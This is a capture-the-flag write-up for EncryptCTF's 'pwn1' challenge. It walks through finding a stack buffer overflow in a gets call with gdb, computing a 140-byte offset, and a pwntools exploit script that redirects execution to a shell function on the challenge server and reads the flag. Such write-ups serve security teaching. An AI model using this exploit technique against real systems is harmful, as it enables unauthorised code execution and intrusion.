## EncryptCTF: pwn1
##### *tl;dr: buffer overflow to change instruction pointer*
#### This challenge is basically just like the previous challenge pwn0, where we can take advantage of a vulnerable gets call to overwrite the buffer, smash the stack, and change the control flow. We start with security measure recon:
```
$ checksec pwn1
[*] '/home/venom/Desktop/encryptCTF_writeup/pwn1_SOLVED/pwn1'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
````
#### As we can see, same as the previous challenge, where NX is enabled but no canary is guarding the stack. We perform a test drive with the binary:
```
$ ./pwn1
Tell me your name: arieees666
Hello, arieees666
```
#### Asks for our name, and prints it out - nothing interesting here, we'd rather fire up gdb and start listing and disassembling functions.
```
$ gdb ./pwn1
  gdb-peda$ info functions
    0x080484ad  shell
    0x080484c1  main
```
#### We see two interesting functions, and one of which is named shell. But before we get to that, we start by taking a look at main.
```
gdb-peda$ disas main
  [...]
   0x080484f9 <+56>:	call   0x8048350 <printf@plt>
   0x080484fe <+61>:	lea    eax,[esp+0x10]
   0x08048502 <+65>:	mov    DWORD PTR [esp],eax
   0x08048505 <+68>:	call   0x8048360 <gets@plt>
   0x0804850a <+73>:	lea    eax,[esp+0x10]
```
#### Again, there's our gets call which is the entry point for our exploit. Next, we disassemble the shell function: 
```
gdb-peda$ disas shell
Dump of assembler code for function shell:
   0x080484ad <+0>:	push   ebp
   0x080484ae <+1>:	mov    ebp,esp
   0x080484b0 <+3>:	sub    esp,0x18
   0x080484b3 <+6>:	mov    DWORD PTR [esp],0x80485c0
   0x080484ba <+13>:	call   0x8048370 <system@plt>
   0x080484bf <+18>:	leave  
   0x080484c0 <+19>:	ret    
End of assembler dump.
```
#### We see a call to system, which gives us a shell. So we know now what to do: overwrite the eip register and point it to the address of the shell function to give us shell control. We do another pattern create and get the offset needed.
```
gdb-peda$ pattern create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'

gdb-peda$ r
Starting program: /home/venom/Desktop/encryptCTF_writeup/pwn1_SOLVED/pwn1 
Tell me your name: 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
[...]
EIP: 0x416d4141 ('AAmA')
Stopped reason: SIGSEGV
0x416d4141 in ?? ()
[...]

gdb-peda$ pattern offset AmAA
AmAA found at offset: 140
```
#### Now that we have what we need, we create an exploit script, send it to our challenge server, and interact with the shell that we have:
##### exploit.py
```python
from pwn import *

#: Connect to challenge server
HOST = '104.154.106.182' 
PORT = 2345
p = remote(HOST,PORT)
print(p.recv())

#: Exploit code
offset = 'A' * 140
shell = p32(0x80484ad)
exploit = offset + shell

#: Send payload
p.sendline(exploit)
print(p.recv())
p.interactive()
```
#### Execute our script, access our shell, get the flag!
```
$ python exploit.py
[+] Opening connection to 104.154.106.182 on port 2345: Done
Tell me your name: 
Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xad\x84\x0

[*] Switching to interactive mode
$ ls
flag.txt
pwn1
$ cat flag.txt
encryptCTF{Buff3R_0v3rfl0W5_4r3_345Y}
$ 
[*] Interrupted
[*] Closed connection to 104.154.106.182 port 2345
```
